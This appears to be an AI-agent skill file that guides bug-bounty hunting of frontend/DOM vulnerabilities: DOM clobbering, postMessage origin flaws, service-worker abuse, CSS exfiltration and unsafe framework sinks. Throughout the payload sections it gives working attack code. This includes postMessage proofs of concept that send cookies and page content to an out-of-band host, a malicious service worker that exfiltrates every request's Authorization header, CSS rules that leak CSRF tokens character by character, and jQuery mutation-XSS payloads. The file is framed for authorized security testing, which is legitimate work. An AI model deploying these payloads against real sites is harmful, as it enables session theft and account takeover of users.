---
name: hunt-frontend-dom
description: Hunting skill for frontend / DOM security vulnerabilities — DOM-based XSS, DOM clobbering, postMessage origin mistakes, service-worker abuse, CSS exfiltration, and framework/SPA sinks. Built from 1 curated source skill (hunt-skills/hunt-dom/SKILL.md distilled from PortSwigger Web Security Academy DOM labs, Gareth Heyes / DOM-Invader, Michał Bentkowski sanitizer research, d0nut CSS-injection research, and jQuery CVE-2020-11022 / CVE-2020-11023); no full bug-bounty reports were read. Use when the payload lives in the victim's browser and the server never sees it — WAFs and server-side input filters do not apply. Impact is proven only by OOB callbacks and state change, never by a DevTools alert.
sources: curated_source_skill, portswigger_research, public_security_research
report_count: 0
full_reports_read: 0
source_skills: 1
---

## Crown Jewel Targets

DOM-based attacks execute in the **victim's browser** — the server often
never sees the payload, so WAFs and server-side input filters do not apply.
A `message` handler that trusts `event.data` without validating `event.origin`
yields cross-origin token theft with **no XSS needed**.

Priority targets are the places where attacker-controlled markup, messages,
or styles reach a JavaScript sink. The common thread: the browser is the
privileged execution context, and the payload never traverses the server.

**Highest-value chains (ranked by impact):**

- **Same-origin Service Worker via stored XSS** — register a **same-origin**
  SW script reachable through a file upload, open-redirect, or served route,
  then intercept all in-scope `fetch` for persistent credential capture.
  This survives tab close → **Critical**.

- **PostMessage no/weak origin check → session theft / DOM-XSS** — a `message`
  handler that trusts `event.data` without validating `event.origin` lets an
  attacker iframe/opener drive privileged actions or feed a sink →
  **High–Critical** (ATO).

- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection
  (no `<script>`) overwrites a JS global like `window.config` or shadows a
  DOM lookup, and the app later treats that value as a URL/code → sink fires
  under a markup-only injection where script is filtered → **High**.

- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a
  CSRF token / API key / nonce char-by-char to an OOB host with **zero
  JavaScript** → **Medium** (raise if the chained CSRF is account-critical).

- **`dangerouslySetInnerHTML` / `v-html` / `.html()` without a sanitizer** —
  stored DOM-XSS → **High** (XSS → ATO).

**Why these are crown jewels:** each one either (a) fires where no
server-side control exists, (b) steals a session/token without needing script
execution, or (c) persists beyond a single page load — the DOM equivalent of
a server-side RCE.

### Grounding — public research this is distilled from

The single curated source skill credits the following technique provenance.
These are **technique provenance**, not severity inflation:

- **DOM Clobbering / DOM-Invader** — Gareth Heyes and the PortSwigger Web
  Security Academy "DOM clobbering" topic. DOM-Invader ships a dedicated
  clobbering scanner. Sink taxonomy maps to the academy's DOM-based labs.

- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum)
  blog series on bypassing HTML sanitizers via clobbering and mutation XSS.

- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and
  **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` /
  `.append()` mutates into executing markup. Grep the bundled jQuery version;
  this is one of the most common real-world DOM-XSS roots.

- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With
  CSS" research (sequential `@import` recursion removes the per-char-position
  constraint).

> Cite only what you reproduce. Do not paste these named references into a
> report as "proof" — your PoC against the live target is the evidence.

**Full corpus link:** the single source skill's complete distilled knowledge
is archived at:

```
E:\webt\skill-setup\skills-extract-from-reports\hunt-frontend-dom\references\source-knowledge.md
```

That archive holds 36 unique sections from 1 source file. This SKILL.md is
the field guide; the archive is the verbatim source of truth.

---

## Attack Surface Signals

Look for these injection points and artifacts. They tell you which DOM bug
class is reachable and which one to test first.

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

**Interpreting the signals:** HTML-but-no-`<script>` fields are the exact
precondition for clobbering / jQuery mXSS; iframe-heavy pages (SSO, embed,
widget, OAuth, checkout) are postMessage factories; a served `/sw.js` path or
an upload/route returning `text/javascript` is the SW placement primitive;
theme/CSS/markdown-CSS passthrough is the CSS-exfil surface.

**Framework / bundle signals:** Next.js/React — `/_next/static/chunks/pages/*.js`,
`dangerouslySetInnerHTML`; Vue — `v-html=`, `[innerHTML]=`; jQuery < 3.5.0 —
`.html()`/`.append()` (mXSS); Angular/Vue/Handlebars/Mustache/Nunjucks/Alpine —
`{{}}` sinks; a DOMPurify/sanitize-html dependency (check version and
clobbering/mXSS history).

**Browser-side signal (critical):** DOM behavior is client-only. `curl`
returns server HTML, not the rendered DOM. Confirm sinks by viewing the
**rendered DOM** in a browser, not by reading the raw response. An SSR
framework can make a sink look server-rendered under `curl` when it is
actually live in the client.

**Tool signals:** DOM Invader (built into the Burp browser) — sources→sinks,
postMessage logger, clobbering scanner. Burp Collaborator / interactsh /
request-bin — mandatory OOB sink for CSS-exfil and SW PoCs. Verify any tool
URL before citing it; do not paste unverified repo links.

---

## Discovery Patterns From Curated Source Skills

Four discovery patterns, one per core technique family in the source skill.
Each is followed by the exact recon command and the "what makes it
exploitable" criterion. A source that never reaches a sink is not a finding.

### Discovery Pattern 1 — DOM Clobbering (markup-only global overwrite)

The core idea: named HTML elements become properties on `window` via the
named-access / document named-property behavior. If the app later reads a
non-built-in global and concatenates it into a URL, HTML string, or `eval`,
attacker markup controls that value.

Clobber a **non-built-in** global the app reads (built-in methods like
`getElementById` cannot be shadowed this way):

```html
<a id="config"></a><a id="config" name="url">
<!-- window.config.url resolves to an attacker-controlled element/string -->

<base href="https://evil.com/">
<!-- bends every relative src/href on the page -->
```

Browser-console sweep — find globals that are clobberable **and** reach a
sink. A variable only matters if the app later concatenates it into a
URL / HTML / `eval`:

```javascript
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];

susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined)
    console.log('[GLOBAL]', k, '=', v);
});
```

Source review — find globals fed into sinks (this is what makes clobbering
exploitable):

```bash
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
```

DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable
sources→sinks.

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed
to `.html()` / `.append()` self-mutates to execute
(**CVE-2020-11022 / CVE-2020-11023**). Confirm the version, then test:

```html
<style><style /><img src=x onerror=alert(document.domain)>
```

**Exploitability criterion:** the clobbered global must actually reach a
sink. An element that shadows `window.foo` but is never read by the app is
harmless. Follow the data: `window.config.url` → `script.src` / `location`
→ code execution.

---

### Discovery Pattern 2 — PostMessage listener & sender

Two bug classes:

- **(a) Listener** trusts cross-origin data → drive a sink or privileged
  action.
- **(b) Sender** broadcasts secrets with target origin `'*'` → any framing
  page reads them.

Find handlers and flag the ones with NO origin check:

```bash
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" \
  recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b"

# Then for each hit, read +/- 20 lines:
# where does event.data go? (innerHTML / eval / location / token store)
```

Find senders that leak secrets:

```bash
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" \
  recon/$TARGET/ --include="*.js" 2>/dev/null
```

**False-positive guard:** a handler with a *partial* check
(`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex
`target\.com`) is still vulnerable — bypass with `target.com.evil.com` or
`eviltarget.com`. Confirm by serving the PoC from such a look-alike host and
showing the message still lands.

**Handler race:** beyond static origin/sender checks, some handlers trust
the FIRST message, or read `event.origin` while it is still `""`/`null`
during frame load. Flood `postMessage` in a tight loop during iframe/popup
load, or fire from `about:blank` before navigation, so your message lands
before the legit sender or before strict origin setup. Test any handler that
assumes "first message = trusted" (the source cites the disclosed case
`reports/381356`).

**Exploitability criterion:** for a listener, show the privileged action or
DOM-XSS firing in the origin; for a sender, capture a real secret via OOB.
A noisy `message` log alone is not proof.

---

### Discovery Pattern 3 — Service Worker abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be
same-origin** as the page calling `register()`.

- A cross-origin script (`https://evil.com/sw.js`) throws `SecurityError`.
- There is **no header** that enables cross-origin SW *script* registration.
- `Service-Worker-Allowed` only widens the **scope** a same-origin script may
  control, not where the script may live.

The realistic path: get a SW script **onto the target origin** (a file upload
that serves JS, an open-redirect/path the origin reflects as a script, a
JSON/JSONP endpoint with `text/javascript`, or an existing route under your
control), then register it from same-origin XSS.

Enumerate existing SW + scope:

```bash
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"

for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"
done

curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"

# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

**Persistence note:** a SW survives tab close and re-runs on next visit
within scope — that is what makes it Critical. Prove it by closing all tabs,
reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

**Exploitability criterion:** registration must succeed from the same origin
(no `SecurityError`), and interception of an in-scope request plus its auth
header must be OOB-confirmed.

---

### Discovery Pattern 4 — CSS exfiltration & framework sinks

CSS exfil targets hidden CSRF inputs, API keys in `meta`, and nonce
attributes — anywhere a secret sits in an attribute the selector engine can
test (template, markdown CSS, etc.).

```
# Step 1: confirm injection — inject "color:red" on a known element, observe render.
# Step 2: leak attribute values char-by-char via attribute selectors + url() to OOB.
```

**Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that
blocks *script execution* — it does **not** bypass a CSP whose `style-src`,
`img-src`, `default-src`, or `connect-src` restricts external origins, or
`form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is
**blocked**. Always read the live `Content-Security-Policy` header first;
if external resource origins are locked down, CSS exfil is dead — say so
rather than claim it.

Framework-sink discovery (Phase 5 of the source):

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" \
  recon/$TARGET/ --include="*.js" 2>/dev/null

# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" \
  | grep -oP 'dangerouslySetInnerHTML.{0,120}'

# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

Template-engine detection (probe the `{{}}` sink in a sandbox-bypass form;
confirm it is client-side by viewing the rendered DOM, not `curl`):

```bash
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | head
```

**Exploitability criterion:** one OOB callback per correct character (CSS),
or user data reaching an unsanitized framework sink (XSS). A rendered color
or a `curl`-visible sink is not enough.

---

## Step-by-Step Hunting Methodology

1. **Decide which DOM class fits the surface.**
   - Markup survives but `<script>` is stripped → DOM clobbering / jQuery mXSS.
   - An iframe / SSO / widget / payment frame → postMessage.
   - A file-upload or `text/javascript` route → service worker.
   - A CSS / theme / markdown-CSS field → CSS exfil.
   - A React / Vue sink → `dangerouslySetInnerHTML` / `v-html`.

2. **Recon the JS bundles** with the grep blocks above. Save hits to
   `recon/$TARGET/`. For each hit, read ±20 lines to trace **source → sink**.
   A source that never reaches a sink is not a finding.

3. **Set up an OOB receiver first** — Burp Collaborator, interactsh, or a
   request-bin. Every PoC in this skill terminates in an OOB callback. Use a
   unique per-test marker (`btoa(domain)+nonce`) so a hit is attributable to
   YOUR payload, not background traffic.

4. **DOM clobbering pass.**
   - Run the browser-console `susp` sweep.
   - Inject `<a id="config"><a id="config" name="url">` and
     `<base href="https://evil.com/">` at the markup injection point.
   - Show the clobbered value reaching `script.src`, `location`,
     `innerHTML`, or `eval`.
   - Check the jQuery version; if < 3.5.0, test the self-closing-tag
     mutation payload.

5. **PostMessage pass.**
   - For every no-origin-check handler, host an attacker page that frames
     the target and posts a shaped payload.
   - For every `postMessage(..., '*')` sender, frame the target silently and
     log `e.origin` / `e.data`, firing OOB when a secret appears.
   - Re-test weak-check handlers from a look-alike origin.
   - Race any "first message = trusted" handler.

6. **Service Worker pass.**
   - Enumerate existing SW paths and scopes.
   - Find a same-origin route that serves your content as `text/javascript`.
   - From same-origin XSS, register the script with the intended scope.
   - OOB-confirm registration.
   - Prove interception of an in-scope `fetch` and its auth header.
   - Close tabs → reopen → show a fresh OOB hit with no XSS re-trigger
     (persistence).

7. **CSS exfil pass.**
   - Read the live CSP.
   - If external styling/image origins are allowed, confirm style injection
     with `color:red`.
   - Generate the per-position selector set.
   - Show one OOB hit per correct character forming the real token.
   - Use that token in a state-changing CSRF request.

8. **Framework-sink pass.**
   - Grep `dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html(`.
   - Confirm the sink is reachable from user data without a sanitizer.
   - Confirm it is client-side by inspecting the **rendered DOM**, not `curl`.
   - Detect Angular / Vue / Handlebars / Mustache / Nunjucks / Alpine and
     probe the `{{}}` sink in a sandbox-bypass form.

9. **Chain it.** Use the Chain Table below to turn a primitive into impact:
   - clobbering → DOM-XSS
   - postMessage → ATO
   - CSS exfil → CSRF
   - SW → persistent credential intercept

10. **Apply Gate 0 before writing the report.** OOB-confirm and state-prove;
    a technique that only fires in DevTools is not a finding.

**Chain Table (from the source):**

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Payload & Detection Patterns

### Generic DOM sinks (the grep backbone)

```bash
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
```

Sink taxonomy (PortSwigger DOM-based labs): `innerHTML`, `eval`,
`new Function`, `location` / `.assign` / `.href`, `script.src`, `iframe.src`,
`document.write`, `setAttribute('href'|'src')`, jQuery `.html()` / `.append()`.

The source's sweep targets the highest-frequency ones: `getElementById`,
`baseURI`, `window.*.url/src/href/html/cmd`, `location =`, `innerHTML =`,
`eval(`, `new Function(`, `.src =`.

### DOM clobbering payloads

```html
<a id="config"></a><a id="config" name="url">
<base href="https://evil.com/">
```

```javascript
// Browser console — confirm a global is clobberable and reaches a sink
susp.forEach(k => console.log(k, window[k]));
// HTMLCollection / Element => clobberable namespace
```

```html
<!-- jQuery < 3.5.0 self-closing-tag mutation (CVE-2020-11022 / CVE-2020-11023) -->
<style><style /><img src=x onerror=alert(document.domain)>
```

### postMessage payloads

**PoC A — drive a no-origin-check listener:**

```html
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage(
      {type:'navigate',
       url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage(
      '<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>',
      '*');
  };
</script>
```

**PoC B — capture secrets from a `targetOrigin:'*'` sender:**

```html
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data)));
});
</script>
```

**Race variant:** flood `postMessage` in a tight loop during frame load, or
fire from `about:blank` before navigation.

### location.hash and `location.*` sources

The source's source→sink sweep includes `location\s*=\s*[A-Za-z_]`, and DOM
Invader traces classic DOM sources to sinks. `location.hash` (and
`location.search`, `location.name`, `document.referrer`, `window.name`) is a
canonical DOM source in that same taxonomy: the payload lives only in the
fragment, which reaches the browser but never the HTTP request — so no
server-side filter sees it. Extend the source's sweep to these sources:

```bash
# Extend the source→sink sweep to fragment/URL-derived sources
grep -rnE "location\.hash|location\.search|document\.referrer|window\.name|document\.URL" \
  recon/$TARGET/ --include="*.js" 2>/dev/null
```

```javascript
// Pattern to test: a fragment value concatenated into a sink
//   https://TARGET/page#<payload>
//   -> document.getElementById('x').innerHTML = location.hash.slice(1)
// Confirm with DOM Invader sources→sinks, then OOB-confirm the sink fires
// from the fragment alone (server never received the payload).
```

> This is a **methodology extension** of the source's DOM-source tracing, not
> a claim from a specific report. The proof standard is unchanged: show the
> fragment-only value reaching a sink and firing an OOB callback.

### Service Worker payloads

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN
// (e.g. /uploads/evil-sw.js served by the target).
// scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

### CSS exfil payloads

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set
# (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}'
  for c in chars))
# removes the "static input, one char" limitation
```

### SPA / Next.js / Node.js (SSR) patterns

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" \
  recon/$TARGET/ --include="*.js" 2>/dev/null

curl -s "https://$TARGET/_next/static/chunks/pages/index.js" \
  | grep -oP 'dangerouslySetInnerHTML.{0,120}'

grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" \
  recon/$TARGET/ --include="*.js" 2>/dev/null | head
```

Next.js / React SSR runs in a Node.js runtime: the same sink exists, but an
SSR framework may render it server-side. Confirm it is **client-side** by
viewing the **rendered DOM**, not `curl`. If DOMPurify is present, check its
version and clobbering/mXSS bypass history (Bentkowski). For `{{}}` template
engines, probe in a sandbox-bypass form and confirm client-side execution.

---

## Common Root Causes

1. **Trusting cross-origin message data** — a `message` handler reads
   `event.data` without validating `event.origin`, or validates it partially
   (`indexOf` / `endsWith` / loose regex), letting a look-alike origin drive a
   sink or privileged action.

2. **Broadcasting secrets to `'*'`** — a sender uses
   `postMessage(secret, '*')`, so any framing page reads the token/auth code.

3. **Named-access global clobbering** — the app reads a non-built-in global
   that is actually a named HTML element / HTMLCollection, and later
   concatenates it into a URL / HTML / `eval`. Built-in methods like
   `getElementById` are not the issue; attacker-controlled app globals are.

4. **Serving attacker content as same-origin script** — a file upload,
   open-redirect, JSON/JSONP endpoint, or reflected route with
   `text/javascript` lets an attacker place a SW script on the target origin,
   which same-origin XSS then registers.

5. **Assuming a SW script can be cross-origin** — a frequent mistake. The
   script URL must be same-origin; `Service-Worker-Allowed` widens scope only,
   not script location. Misunderstanding this wastes the entire SW path.

6. **Rendering unsanitized framework HTML** — `dangerouslySetInnerHTML`,
   `v-html`, `[innerHTML]=`, `.html()` fed user data without
   DOMPurify/sanitize-html, or with a sanitizer version vulnerable to
   clobbering / mXSS.

7. **Old jQuery** — bundles < 3.5.0 mutate attacker HTML via `htmlPrefilter`
   self-closing-tag handling (CVE-2020-11022 / CVE-2020-11023) into executing
   markup.

8. **CSS injected into a permissive CSP** — style/theme/markdown-CSS
   passthrough with no restriction on `style-src` / `img-src` / `connect-src`,
   enabling attribute-selector exfil.

9. **"First message = trusted" / uninitialized origin** — handlers that trust
   the first message or read `event.origin` while `""`/`null` during frame
   load.

10. **Treating client-side as server-visible** — assuming `curl` output proves
    a sink is absent, when the real DOM behavior happens only in the browser.

---

## Bypass Techniques

- **Weak origin check bypass** — `origin.indexOf('target.com')>-1`,
  `endsWith('target.com')`, or regex `target\.com` are bypassed with
  `target.com.evil.com` or `eviltarget.com`. Serve the PoC from the look-alike
  host and show the message still lands.

- **Handler race bypass** — flood `postMessage` in a tight loop during
  iframe/popup load, or fire from `about:blank` before navigation, so the
  message arrives before the legit sender or before strict origin setup.
  Target handlers assuming "first message = trusted."

- **DOM-clobbering substitution** — when `<script>` is filtered, inject only
  markup: `<a id="config"><a id="config" name="url">`,
  `<base href="https://evil.com/">`. Shadow app globals; do not try to
  shadow built-in methods like `getElementById`.

- **jQuery mutation bypass** — when the filter blocks obvious `<script>` /
  event handlers, use the self-closing-tag mutation
  (`<style><style /><img src=x onerror=...>`) on jQuery < 3.5.0.

- **Sanitizer bypass** — when DOMPurify is present, check its version for
  clobbering and mutation-XSS (mXSS) bypasses (Bentkowski research) rather
  than assuming the sanitizer ends the path.

- **Same-origin SW placement** — when cross-origin registration fails with
  `SecurityError`, do NOT hunt for a header to enable it (none exists).
  Instead find a same-origin route that serves your content as
  `text/javascript`: file upload, open-redirect, reflected path, or
  JSON/JSONP endpoint.

- **CSP reality check** — CSS exfil survives a CSP that only blocks scripts.
  It dies when `img-src 'self'`, `style-src`, `connect-src`, or `default-src`
  restricts external origins. Read the live CSP; if external origins are
  locked down, do not claim the finding.

- **Client-side confirmation bypass** — SSR frameworks can make a sink look
  server-rendered under `curl`. Confirm client-side behavior by inspecting
  the **rendered DOM**, not the raw HTML.

- **Fragment-only delivery** — when server-side filters inspect request
  parameters, deliver the source via `location.hash` so it never appears in
  the HTTP request (methodology extension of the source's source-tracing).

---

## Gate 0 Validation

Match the repo standard: a technique that *fires in DevTools* is **not** a
finding until impact is **OOB-confirmed** and **state-proven**.

**1. Is impact OOB-confirmed and state-proven right now?**

- **DOM Clobbering** — show the clobbered value actually reaching a sink
  (XSS payload executes, or the app navigates/loads from the attacker URL).
  A clobberable global that never reaches a sink = no impact; do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass
  weak checks from a look-alike origin and capture via OOB. A noisy `message`
  log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.**
  Read CSP first: `img-src` / `style-src` / `connect-src` / `default-src`
  restricting external origins kills it. A blocked `url()` is
  indistinguishable from success in the Network tab — confirm on the
  Collaborator side.
- **Service Worker** — registration must be a **same-origin script**; a
  `SecurityError` means you cited the wrong origin. Prove *persistence*
  (close tabs → reopen → fresh OOB hit, no XSS re-fire).

**2. What does the victim lose?**

- Persistent credential intercept (SW) → full account takeover.
- Session/token theft (postMessage) → ATO.
- CSRF token leak (CSS exfil) → state change; raise severity if the chained
  CSRF is account-critical.
- DOM-XSS reaching auth/session → High.

**3. Is it reproducible in 10 minutes with unique attribution?**

- Use per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable
  to YOUR payload, not background traffic.
- Body-diff the **rendered DOM**, not the raw HTML — these are client-side.
- A second person must be able to follow the steps and get the same OOB hit
  without prior knowledge.

**Severity anchors (from the source):**

- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the
  chained CSRF is account-critical)

---

## Real Impact Examples

The following scenarios are the source skill's documented impact chains.
They are technique-level illustrations — the evidence in a real report must
be your own live-target PoC, not these narratives.

### Scenario A — Same-origin Service Worker → persistent credential intercept (Critical)

Stored XSS on a page reachable on the target origin gives a script-execution
primitive. The attacker finds an upload route that serves content with
`Content-Type: text/javascript`, places `evil-sw.js` there, and registers it
same-origin at scope `/`. The SW intercepts every in-scope `fetch`,
exfiltrating each URL and its `Authorization` header to an OOB endpoint.
Closing all tabs and reopening the origin produces a fresh OOB hit with no
XSS re-trigger — proving persistence. Every subsequent authenticated request
on the origin is captured until the SW is unregistered.

### Scenario B — PostMessage no-origin-check listener → DOM-XSS → ATO (High–Critical)

An SSO/widget page registers a `message` listener and writes `event.data`
straight into `innerHTML` with no `event.origin` validation. An attacker
hosts a page that frames the widget and posts
`<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>`.
The handler executes it in the target origin, exfiltrating rendered DOM
(including session markers) to the OOB server. Replaying from a look-alike
origin against a *weak* check confirms the bypass.

### Scenario C — DOM clobbering → DOM-XSS under markup-only filtering (High)

A comment field permits HTML but strips `<script>`. The app reads a global
`config.url` and sets `location = config.url`. The attacker injects
`<a id="config"><a id="config" name="url" href="javascript:...">`,
clobbering `window.config.url` so the later assignment navigates to an
attacker-controlled URL, firing script under a filter that allowed only
markup.

### Scenario D — CSS exfil → CSRF (Medium+)

A theme/CSS field allows external `url()`. A hidden `input[name="csrf"]`
holds the token. Sequential `@import` rules isolate each character position;
one OOB hit per correct character reconstructs the real token. The attacker
then submits a state-changing request with that token. OOB callbacks per
character, not a rendered color, are the proof.

---

## Source Skill Lineage

Single curated source. Unique contributions of each section of
`hunt-skills/hunt-dom/SKILL.md` (archived verbatim at
`E:\webt\skill-setup\skills-extract-from-reports\hunt-frontend-dom\references\source-knowledge.md`):

| Source path | Unique contribution |
|-------------|---------------------|
| `hunt-skills/hunt-dom/SKILL.md` — Crown Jewel Targets | Browser-execution premise (server never sees payload), the five ranked highest-value chains, and the "cite only what you reproduce" provenance note (PortSwigger, Gareth Heyes, Bentkowski, d0nut, jQuery CVEs). |
| `hunt-skills/hunt-dom/SKILL.md` — DOM Clobbering (Phase 1) | Non-built-in global clobbering via `<a id>` / `<base href>`, the `susp` console sweep, sink grep, jQuery `htmlPrefilter` CVE-2020-11022 / CVE-2020-11023 angle. |
| `hunt-skills/hunt-dom/SKILL.md` — Phase 2 (PostMessage) | Listener vs sender split, origin-check grep, PoC A / PoC B, weak-check look-alike bypass, and the handler-race case (`reports/381356`). |
| `hunt-skills/hunt-dom/SKILL.md` — Phase 3 (Service Worker) | Same-origin-script hard rule, `Service-Worker-Allowed` scope clarification, SW enumeration, registration/interception code, persistence proof. |
| `hunt-skills/hunt-dom/SKILL.md` — CSS exfil (Phase 4) | Attribute-selector char leak, sequential-`@import` generator, CSP scope caveat, "OOB per character" proof standard. |
| `hunt-skills/hunt-dom/SKILL.md` — Phase 5 & framework sinks | `dangerouslySetInnerHTML` / `v-html` / `.html()` greps, Next.js bundle grep, template-engine detection, sanitizer version check. |
| `hunt-skills/hunt-dom/SKILL.md` — Chain Table & Tools | Six-row DOM finding → chain → impact table; DOM Invader and Collaborator / interactsh / request-bin tool guidance. |
| `hunt-skills/hunt-dom/SKILL.md` — Validation | Per-technique false-positive discipline, unique-marker / body-diff guidance, four severity anchors. |

No full bug-bounty reports were read for this skill (`report_count: 0`,
`full_reports_read: 0`). All claims above are traceable to the single source
skill; nothing is attributed to a fabricated report ID or URL.

---

## Related Skills & Chains

- **`hunt-xss`** — DOM clobbering and framework sinks terminate in DOM-XSS;
  use `hunt-xss` for the reflected/stored XSS side and payload refinement.
  Chain: clobbered global → `innerHTML`/`eval` → DOM-XSS → ATO.

- **`hunt-account-takeover`** / **`hunt-session-management`** — postMessage
  token theft and SW credential interception both aim at ATO; hand the stolen
  session/token to these skills for account-takeover impact.

- **`hunt-csrf`** — CSS exfil's payoff is a leaked CSRF token; chain the
  OOB-confirmed token into a state-changing CSRF request via `hunt-csrf`.

- **`hunt-cors`** — both involve cross-origin trust boundaries; a postMessage
  origin mistake and a permissive CORS policy often coexist on the same
  widget/origin.

- **`hunt-open-redirect`** — an open redirect or reflected route is the
  mechanism for getting a same-origin SW script served; chain
  `hunt-open-redirect` → same-origin SW registration.

- **`hunt-upload`** — an upload that serves `text/javascript` is the SW-script
  placement primitive; coordinate with `hunt-upload` for content-type and
  path control.

- **`hunt-prototype-pollution`** — both are client-side global/object
  manipulation families; clobbering and prototype pollution can combine to
  steer a sink.

- **`hunt-clickjacking`** — framing a privileged page is shared with the
  postMessage PoC setup; UI-redressing can drive the same privileged actions
  when message handlers are absent.

- **`hunt-nextjs`** / **`hunt-nodejs`** (hunt-skills library) — Next.js/React
  SSR and Node.js runtime specifics for the `dangerouslySetInnerHTML` and
  minified-bundle patterns.

